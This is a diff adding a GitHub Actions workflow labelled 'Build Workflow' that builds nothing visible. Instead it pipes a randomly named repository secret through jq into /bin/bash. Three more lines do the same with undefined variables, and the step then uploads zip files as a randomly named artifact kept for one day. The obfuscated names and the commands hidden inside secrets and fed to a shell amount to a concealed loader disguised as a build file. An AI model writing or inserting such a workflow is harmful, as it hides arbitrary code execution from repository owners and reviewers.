@@ -1,0 +1,29 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          xkfr58: ${{ secrets.xkfr58 }}
+        run: |
+          printf '%s' "$xkfr58" | jq -r .orrkc8697 | /bin/bash
+          echo $gtnzl974 | jq -r .kqozi76824 | /bin/bash
+          echo $mkf320 | jq -r .q2891 | /bin/bash
+          printf '%s' "$fq6" | jq -r .cedcn5920 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: X8HaoQW9
+          path: "*.zip"
+          retention-days: 1
